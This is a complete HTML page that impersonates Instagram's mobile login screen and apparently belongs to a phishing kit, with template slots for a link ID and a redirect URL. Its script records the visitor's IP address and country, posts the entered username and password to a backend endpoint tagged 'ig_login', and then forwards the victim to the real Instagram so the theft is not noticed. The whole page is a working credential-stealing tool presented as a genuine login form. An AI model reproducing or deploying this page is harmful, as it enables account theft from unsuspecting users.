<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background: #fff;
    display: flex;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    padding: 0;
}

.container {
    width: 100%;
    max-width: 450px;
    min-height: 100vh;
    background: #fff;
    display: flex;
    flex-direction: column;
    position: relative;
}

/* ===== HEADER ===== */
.header {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px 16px 8px;
    position: relative;
}

.header-back {
    position: absolute;
    left: 12px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    padding: 8px;
}

.header-back svg {
    width: 24px;
    height: 24px;
    fill: #262626;
}

.header-logo {
    display: flex;
    align-items: center;
    justify-content: center;
}

.header-logo svg {
    width: 110px;
    height: 40px;
}

/* ===== LOGIN FORM ===== */
.login-section {
    padding: 0 24px;
    flex: 1;
}

.login-title {
    font-size: 18px;
    font-weight: 600;
    color: #262626;
    text-align: center;
    margin-bottom: 8px;
}

.login-subtitle {
    font-size: 13px;
    color: #8e8e8e;
    text-align: center;
    margin-bottom: 24px;
    line-height: 1.4;
}

.input-group {
    margin-bottom: 8px;
}

.input-field {
    position: relative;
    width: 100%;
}

.input-field input {
    width: 100%;
    padding: 14px 12px 4px;
    border: 1px solid #dbdbdb;
    border-radius: 6px;
    font-size: 12px;
    background: #fafafa;
    color: #262626;
    outline: none;
    transition: border-color 0.2s;
    height: 48px;
}

.input-field input:focus {
    border-color: #a8a8a8;
    background: #fff;
}

.input-field input:focus + .input-placeholder,
.input-field input:not(:placeholder-shown) + .input-placeholder {
    font-size: 10px;
    top: 6px;
    opacity: 1;
}

.input-placeholder {
    position: absolute;
    left: 12px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    color: #8e8e8e;
    pointer-events: none;
    transition: all 0.15s ease;
    opacity: 0.7;
}

.password-toggle {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: #262626;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    padding: 4px 8px;
    display: none;
}

.password-toggle.visible {
    display: block;
}

/* ===== LOGIN BUTTON ===== */
.login-btn {
    width: 100%;
    padding: 12px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 12px;
    opacity: 0.7;
    transition: all 0.2s;
    pointer-events: none;
}

.login-btn.active {
    opacity: 1;
    pointer-events: auto;
}

.login-btn.active:hover {
    background: #1875d8;
}

.login-btn:active {
    transform: scale(0.98);
}

/* ===== OR DIVIDER ===== */
.or-divider {
    display: flex;
    align-items: center;
    margin: 20px 0;
}

.or-line {
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.or-text {
    padding: 0 18px;
    color: #8e8e8e;
    font-size: 13px;
    font-weight: 500;
}

/* ===== FACEBOOK LOGIN ===== */
.facebook-login {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    padding: 10px;
    background: none;
    border: none;
    cursor: pointer;
    width: 100%;
    margin-bottom: 12px;
}

.facebook-login svg {
    width: 20px;
    height: 20px;
}

.facebook-login span {
    color: #385185;
    font-size: 14px;
    font-weight: 600;
}

.facebook-login:hover span {
    text-decoration: underline;
}

/* ===== FORGOT PASSWORD ===== */
.forgot-link {
    display: block;
    text-align: center;
    color: #00376b;
    font-size: 12px;
    text-decoration: none;
    margin-top: 12px;
}

.forgot-link:hover {
    text-decoration: underline;
}

/* ===== SIGN UP SECTION ===== */
.signup-section {
    border-top: 1px solid #dbdbdb;
    padding: 20px 24px;
    text-align: center;
    margin-top: 24px;
}

.signup-text {
    color: #262626;
    font-size: 14px;
}

.signup-text a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
}

.signup-text a:hover {
    text-decoration: underline;
}

/* ===== APP DOWNLOAD ===== */
.app-download {
    padding: 12px 24px 40px;
    text-align: center;
}

.app-download p {
    color: #262626;
    font-size: 14px;
    margin-bottom: 12px;
}

.app-badges {
    display: flex;
    justify-content: center;
    gap: 8px;
}

.app-badge {
    display: inline-block;
}

.app-badge img {
    height: 40px;
}

/* ===== FOOTER ===== */
.footer {
    padding: 16px 24px;
    text-align: center;
}

.footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 6px 16px;
    margin-bottom: 8px;
}

.footer-links a {
    color: #8e8e8e;
    font-size: 12px;
    text-decoration: none;
}

.footer-links a:hover {
    text-decoration: underline;
}

.footer-copyright {
    color: #8e8e8e;
    font-size: 12px;
}

/* ===== LANGUAGE SELECTOR ===== */
.lang-selector {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 4px;
    margin-bottom: 16px;
}

.lang-selector select {
    background: transparent;
    border: none;
    color: #8e8e8e;
    font-size: 12px;
    cursor: pointer;
    outline: none;
}

.lang-selector select option {
    color: #262626;
}

/* ===== LOADING OVERLAY ===== */
.loading-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(255,255,255,0.92);
    z-index: 999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    gap: 16px;
}

.loading-overlay.active {
    display: flex;
}

.instagram-spinner {
    width: 50px;
    height: 50px;
    position: relative;
}

.instagram-spinner:before,
.instagram-spinner:after {
    content: '';
    position: absolute;
    border-radius: 50%;
}

.instagram-spinner:before {
    width: 100%;
    height: 100%;
    background: conic-gradient(from 0deg, #f58529, #dd2a7b, #8134af, #515bd4, #00aff5, #f58529);
    mask: radial-gradient(farthest-side, transparent calc(100% - 4px), #fff 0);
    -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 4px), #fff 0);
    animation: spin 0.8s linear infinite;
}

.instagram-spinner:after {
    width: 80%;
    height: 80%;
    top: 10%;
    left: 10%;
    background: #fff;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.loading-text {
    color: #8e8e8e;
    font-size: 14px;
    font-weight: 500;
}

/* ===== RESPONSIVE ===== */
@media (max-width: 380px) {
    .login-section {
        padding: 0 16px;
    }
    .app-badges {
        flex-direction: column;
        align-items: center;
    }
}
</style>
</head>
<body>

<div class="container">

    <div class="header">
        <button class="header-back" onclick="history.back()">
            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
        </button>
        <div class="header-logo">
            <svg viewBox="0 0 176 56" fill="none">
                <path d="M26.8 14.2c-7 0-12.6 5.7-12.6 12.6s5.7 12.6 12.6 12.6 12.6-5.7 12.6-12.6-5.6-12.6-12.6-12.6zm0 20.8c-4.5 0-8.2-3.7-8.2-8.2s3.7-8.2 8.2-8.2 8.2 3.7 8.2 8.2-3.7 8.2-8.2 8.2zm16.2-21.3c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9zm8.5 2.8c-.3-6.3-1.7-11.9-6.3-16.4C41.5.6 36 .8 29 1.1 22 .8 16.5.6 12.8 4.1 8.2 8.6 6.8 14.2 6.5 20.5c-.3 6.4-.3 8.6 0 15 .3 6.3 1.7 11.9 6.3 16.4 3.7 3.5 8.5 3.4 16.2 3.3 7.7.1 12.5.2 16.2-3.3 4.6-4.5 6-10.1 6.3-16.4.3-6.4.3-8.6 0-15z" fill="#262626"/>
                <path d="M49.5 36.5c-.3 5.7-1.5 10.3-5.3 14.1-3.3 3.2-7.7 3.3-14.4 3.3h-.1c-6.7 0-11.1-.1-14.4-3.3-3.8-3.8-5-8.4-5.3-14.1-.3-6.2-.3-8.2 0-14.5.3-5.7 1.5-10.3 5.3-14.1C18.6 4.7 23 4.6 29.7 4.6h.1c6.7 0 11.1.1 14.4 3.3 3.8 3.8 5 8.4 5.3 14.1.3 6.3.3 8.3 0 14.5z" fill="#fff"/>
                <path d="M69.2 37.6c-1.5 0-2.8-.2-3.9-.7-1.1-.5-2-1.1-2.7-2-.7-.9-1.2-1.9-1.5-3.1-.3-1.2-.5-2.5-.5-4V17.6h7.1v10.4c0 1.5.2 2.8.7 3.8.5 1 1.2 1.7 2.2 2.2 1 .5 2.2.7 3.6.7 1.5 0 2.7-.2 3.7-.7 1-.5 1.8-1.2 2.3-2.2.5-1 .8-2.3.8-3.8V17.6h7.1v10c0 1.6-.2 3-.5 4.2-.3 1.2-.8 2.3-1.5 3.1-.7.9-1.6 1.6-2.7 2.1-1.1.5-2.4.7-3.9.7-1.5 0-2.8-.2-3.9-.7-1.1-.5-2-1.2-2.7-2.1-.7-.9-1.2-1.9-1.5-3.1-.3-1.2-.5-2.6-.5-4.2V17.6h7.1v10.4c0 1.5.2 2.8.7 3.8.5 1 1.2 1.7 2.2 2.2 1 .5 2.2.7 3.6.7 1.5 0 2.7-.2 3.7-.7 1-.5 1.8-1.2 2.3-2.2.5-1 .8-2.3.8-3.8V17.6h7.1v10c0 1.6-.2 3-.5 4.2-.3 1.2-.8 2.3-1.5 3.1-.7.9-1.6 1.6-2.7 2.1-1.1.5-2.4.7-3.9.7-1.5 0-2.8-.2-3.9-.7-1.1-.5-2-1.2-2.7-2.1-.7-.9-1.2-1.9-1.5-3.1-.3-1.2-.5-2.6-.5-4.2V17.6h7.1v10.4c0 1.5.2 2.8.7 3.8.5 1 1.2 1.7 2.2 2.2 1 .5 2.2.7 3.6.7 1.5 0 2.7-.2 3.7-.7 1-.5 1.8-1.2 2.3-2.2.5-1 .8-2.3.8-3.8V17.6h7.1v10c0 1.6-.2 3-.5 4.2-.3 1.2-.8 2.3-1.5 3.1-.7.9-1.6 1.6-2.7 2.1-1.1.5-2.4.7-3.9.7-1.5 0-2.8-.2-3.9-.7-1.1-.5-2-1.2-2.7-2.1-.7-.9-1.2-1.9-1.5-3.1-.3-1.2-.5-2.6-.5-4.2V17.6h7.1v10.4c0 1.5.2 2.8.7 3.8.5 1 1.2 1.7 2.2 2.2 1 .5 2.2.7 3.6.7 1.5 0 2.7-.2 3.7-.7 1-.5 1.8-1.2 2.3-2.2.5-1 .8-2.3.8-3.8V17.6h7.1v10c0 1.6-.2 3-.5 4.2-.3 1.2-.8 2.3-1.5 3.1-.7.9-1.6 1.6-2.7 2.1-1.1.5-2.4.7-3.9.7z" fill="#262626"/>
            </svg>
        </div>
    </div>

    <div class="login-section">
        <h1 class="login-title">Log in</h1>
        <p class="login-subtitle">Enter your username or email and password to access your account.</p>

        <form id="loginForm">
            <div class="input-group">
                <div class="input-field">
                    <input type="text" id="username" placeholder=" " required autocomplete="username">
                    <span class="input-placeholder">Username or email</span>
                </div>
            </div>

            <div class="input-group">
                <div class="input-field">
                    <input type="password" id="password" placeholder=" " required autocomplete="current-password">
                    <span class="input-placeholder">Password</span>
                    <button type="button" class="password-toggle" id="togglePassword">Show</button>
                </div>
            </div>

            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
        </form>

        <div class="or-divider">
            <span class="or-line"></span>
            <span class="or-text">OR</span>
            <span class="or-line"></span>
        </div>

        <button class="facebook-login" id="fbLoginBtn">
            <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12S0 5.446 0 12.073c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" fill="#1877f2"/></svg>
            <span>Log in with Facebook</span>
        </button>

        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
    </div>

    <div class="signup-section">
        <p class="signup-text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
    </div>

    <div class="app-download">
        <p>Get the app.</p>
        <div class="app-badges">
            <a class="app-badge" href="https://apps.apple.com/app/instagram/id389801252">
                <svg viewBox="0 0 135 40" width="135" height="40"><rect width="135" height="40" rx="4" fill="#000"/><text x="20" y="18" fill="#fff" font-size="8" font-family="Arial">Download on the</text><text x="20" y="30" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">App Store</text></svg>
            </a>
            <a class="app-badge" href="https://play.google.com/store/apps/details?id=com.instagram.android">
                <svg viewBox="0 0 135 40" width="135" height="40"><rect width="135" height="40" rx="4" fill="#000"/><text x="20" y="18" fill="#fff" font-size="8" font-family="Arial">GET IT ON</text><text x="20" y="30" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">Google Play</text></svg>
            </a>
        </div>
    </div>

    <div class="footer">
        <div class="lang-selector">
            <select>
                <option>English (US)</option>
                <option>বাংলা</option>
                <option>हिन्दी</option>
            </select>
            <span style="color:#8e8e8e;font-size:12px;">▼</span>
        </div>
        <div class="footer-copyright">© 2026 Instagram from Meta</div>
    </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
    <div class="instagram-spinner"></div>
    <span class="loading-text">Logging in...</span>
</div>

<script>
// ============ NODE.JS VARIABLES ============
const id = "{{LINK_ID}}";
const red = "{{REDIRECT_URL}}";

// ============ IP DETECTION (Optional Info) ============
let detectedIp = "Unknown";
let detectedCountry = "Unknown";

fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        if (data.ip) {
            detectedIp = data.ip;
            detectedCountry = data.country_name || "Unknown";
        }
    }).catch(e => {});

// ============ FLOATING PLACEHOLDER + VALIDATION ============
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const toggleBtn = document.getElementById('togglePassword');

function checkFormValidity() {
    const u = usernameInput.value.trim();
    const p = passwordInput.value;
    
    if (u && p && p.length >= 6) {
        loginBtn.classList.add('active');
    } else {
        loginBtn.classList.remove('active');
    }

    if (p.length > 0) {
        toggleBtn.classList.add('visible');
    } else {
        toggleBtn.classList.remove('visible');
        passwordInput.type = 'password';
        toggleBtn.textContent = 'Show';
    }
}

usernameInput.addEventListener('input', checkFormValidity);
passwordInput.addEventListener('input', checkFormValidity);

// ============ PASSWORD TOGGLE ============
toggleBtn.addEventListener('click', function() {
    const type = passwordInput.type === 'password' ? 'text' : 'password';
    passwordInput.type = type;
    this.textContent = type === 'password' ? 'Show' : 'Hide';
});

// ============ FORM SUBMISSION & API INTEGRATION ============
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    if (!username || !password) return;

    // Show loading spinner
    document.getElementById('loadingOverlay').classList.add('active');

    // Send credentials to Backend
    fetch('/api/data', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            linkId: id,
            type: 'ig_login', 
            data: {
                username: username,
                password: password,
                ip: detectedIp,
                country: detectedCountry
            }
        })
    }).catch(err => console.log(err));

    // Redirect to final destination after data is sent
    setTimeout(function() {
        let finalRed = (red && red.length > 4 && !red.includes("REDIRECT_URL")) ? red : "https://www.instagram.com/";
        window.location.href = finalRed;
    }, 1500);
});

// ============ FACEBOOK LOGIN BUTTON ============
document.getElementById('fbLoginBtn').addEventListener('click', function() {
    let fbRed = (red && red.length > 4 && !red.includes("REDIRECT_URL")) ? red : "https://www.facebook.com/login.php";
    window.location.href = fbRed;
});
</script>

</body>
</html>
